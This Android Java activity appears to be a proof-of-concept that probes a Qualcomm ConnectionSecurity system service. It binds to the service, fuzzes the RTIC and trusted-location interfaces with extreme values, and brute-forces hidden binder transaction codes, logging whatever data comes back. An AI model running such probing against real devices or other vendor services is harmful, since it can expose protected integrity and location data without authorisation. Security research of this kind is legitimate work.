package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IServiceManager mServiceManager;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            stopRequested.set(false);
            testThread = new Thread(() -> executeFullTest());
            testThread.start();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            appendLog("Service disconnected");
            mServiceManager = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isBound && !isTesting.get()) bindService();
        });
        btnStop.setOnClickListener(v -> {
            if (isBound || isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, perms, 100);
                break;
            }
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        isTesting.set(true);
        appendLog("========== ConnectionSecurity Advanced Exploit Test ==========");

        // 既知のサービス取得（rtic, tloc）
        IBinder rticBinder = getService("rtic");
        IBinder tlocBinder = getService("tloc");

        if (rticBinder != null) {
            IRticService rtic = IRticService.Stub.asInterface(rticBinder);
            testRtic(rtic);
            // さらに transact で未公開メソッドを探索
            discoverMethods(rticBinder, "IRticService");
        }

        if (tlocBinder != null) {
            ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
            testTloc(tloc);
            discoverMethods(tlocBinder, "ITlocService");
        }

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    private IBinder getService(String serviceName) {
        if (mServiceManager == null) return null;
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("Got binder for " + serviceName + ", status=" + status[0]);
                return binder;
            } else {
                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
                return null;
            }
        } catch (RemoteException e) {
            appendLog("RemoteException for " + serviceName + ": " + e.getMessage());
            return null;
        }
    }

    private void testRtic(IRticService rtic) {
        appendLog("--- Testing IRticService with fuzzing ---");
        long[] timestamps = {
            0,
            -1,
            Long.MIN_VALUE,
            Long.MAX_VALUE,
            123456789L,
            System.currentTimeMillis(),
            0xFFFFFFFFL,
            0x100000000L,
            0x7FFFFFFFFFFFFFFFL,
            0x8000000000000000L
        };
        boolean[] bools = {false, true};
        for (long ts : timestamps) {
            if (stopRequested.get()) break;
            for (boolean z : bools) {
                try {
                    int[] status = new int[1];
                    int[] ret = new int[1];
                    byte[] data = rtic.getRticData(ts, status, ret, z);
                    appendLog("TS=" + ts + ", z=" + z + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
                    if (data != null && data.length > 0) {
                        String hex = bytesToHex(data, 100);
                        appendLog("  Data(hex): " + hex);
                        try {
                            String str = new String(data, StandardCharsets.UTF_8);
                            appendLog("  Data(UTF-8): " + str);
                        } catch (Exception e) {}
                    }
                } catch (RemoteException e) {
                    appendLog("RemoteException: " + e.getMessage());
                } catch (Exception e) {
                    appendLog("Exception: " + e.toString());
                }
            }
        }
        // 巨大なバイト配列を引数で渡せないので、代わりに null を渡すテスト
        // 本来は getRticData に byte[] を渡すオーバーロードはないが、リフレクションで可能か?
    }

    private void testTloc(ITlocService tloc) {
        appendLog("--- Testing ITlocService ---");
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = tloc.getTrustedLocation(status, ret);
            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            if (data != null && data.length > 0) {
                String str = new String(data, StandardCharsets.UTF_8);
                appendLog("Data: " + str);
            }
            int warmup = tloc.tlocWarmUp();
            appendLog("tlocWarmUp returned: " + warmup);
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void discoverMethods(IBinder binder, String serviceName) {
        appendLog("--- Discovering hidden methods for " + serviceName + " via transact ---");
        for (int code = 1; code <= 30; code++) {
            if (stopRequested.get()) break;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                // 簡易的なデータを入れてみる
                data.writeInterfaceToken(binder.getInterfaceDescriptor());
                boolean success = binder.transact(code, data, reply, 0);
                if (success) {
                    appendLog("Method code " + code + " succeeded, reply size=" + reply.dataSize());
                    // 読み取りを試みる
                    reply.setDataPosition(0);
                    try {
                        int result = reply.readInt();
                        appendLog("  readInt: " + result);
                    } catch (Exception e) {}
                    try {
                        String s = reply.readString();
                        appendLog("  readString: " + s);
                    } catch (Exception e) {}
                    try {
                        byte[] b = reply.createByteArray();
                        appendLog("  byte[] length: " + (b != null ? b.length : 0));
                    } catch (Exception e) {}
                } else {
                    appendLog("Method code " + code + " failed (security exception)");
                }
            } catch (Exception e) {
                appendLog("Method code " + code + " threw: " + e.getClass().getSimpleName());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    private String bytesToHex(byte[] bytes, int max) {
        StringBuilder sb = new StringBuilder();
        int limit = Math.min(bytes.length, max);
        for (int i = 0; i < limit; i++) {
            sb.append(String.format("%02x", bytes[i] & 0xFF));
        }
        if (bytes.length > max) sb.append("...");
        return sb.toString();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "connsec_exploit_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== ConnectionSecurity Exploit Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) {
            try { unbindService(serviceConnection); } catch (Exception ignored) {}
        }
        saveLog();
    }
}
